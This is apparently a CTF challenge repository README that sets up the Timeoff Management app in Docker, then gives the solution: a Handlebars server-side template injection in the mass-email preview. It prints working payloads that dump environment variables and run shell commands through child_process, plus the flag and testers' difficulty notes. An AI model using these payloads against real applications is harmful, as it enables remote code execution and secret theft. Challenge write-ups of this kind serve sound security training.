# Vacation Planner Docker Target

This repo contains code to set up [Timeoff Management](https://github.com/timeoff-management/timeoff-management-application) as a Docker container.

The app's code is included in a submodule of this repo.

## Usage

1. Change the contents of `flag.txt`
2. `docker build -t vacation-planner .`
3. `docker run -p 3000:3000 --name vacation-planner vacation-planner`

## Exploit

After navigating to the website, you are presented with a login form. Register a new company with bogus details to access the full functionality of the web application.

There is much to browse and test, but eventually you should find the "mass email" page.

Once you try to preview a message that includes `{{`, aiming to find a server-side template injection (SSTI) vulnerability, you are presented with an error message:

```
Error: Parse error on line 1:
{{
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'EOF'
    at Parser.parseError (/var/lib/vacation-planner/timeoff-management-application/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
    at Parser.parse (/var/lib/vacation-planner/timeoff-management-application/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30)
    at HandlebarsEnvironment.parse ...
...
```

From the error message, it is possible to see that Handlebars is being used for template rendering. A quick investigation gives us http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html and the following payload:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Using this as the message body, we can read the environment variables and confirm SSTI.

After trying to get code execution using normal means, it is apparent that `require` keyword is not available in the limited sandbox provided by Handlebars.

Based on https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/, it is possible to bypass the `require` requirement by using `global.process.mainModule.constructor._load` instead.

Final exploit:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat flag.txt\").toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

The message preview will show the results, proving command execution is possible:

```
      e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            flag{with_with_with_with_each_with_this}
```

## Testing Notes - kip

1. The challenge website has a lot to explore. I think it would take a decent amount of time to figure out that the "mass email" function is where the template injection vulnerability lies. Idk if this would factor into the difficulty of the challenge, but I do think this would eat up a bit of time for people. Especially if the challenge description has no hints on what or where the vulnerability is.

2. I don't have experience with Javascript templates, but once I located the "mass email" page, any message with double curly braces resulted in an error message. I wasn't able to notice the "handlebars" template in the error message at first, but I think for people that have more experience with Javascript templates, it wouldn't take them long to realize that it is a template injection vulnerability with the "handlebars" Javascript template language.

3. After that, googling "handlebars template injection" gave me a bunch of blog posts. There is a lot of material online to read on it, especially regarding a vulnerability in the Shopify app. Interestingly, when I google "handlebars template injection ctf", this is the first link that comes up (https://ctftime.org/writeup/16447). It's from CSAW Quals 2019 about a challenge called "Buyify". Seems like the exact same vulnerability as the challenge we have here. It was a 500 point web challenge in CSAW Quals 2019.

4. As for coming up with the actual injection payload, I can't say much about that. Personally I do not think I would have ever gotten the right payload within the duration of the competition. But who knows, with the amount of online writeups on "handlebars template injection", maybe I could have.
Overall, it seems like a very similar challenge to the one used in previous CSAW Quals. The old challenge was weighted 500 points, but I'm sure having access to the writeup for that challenge will make this one much easier for a lot of people.
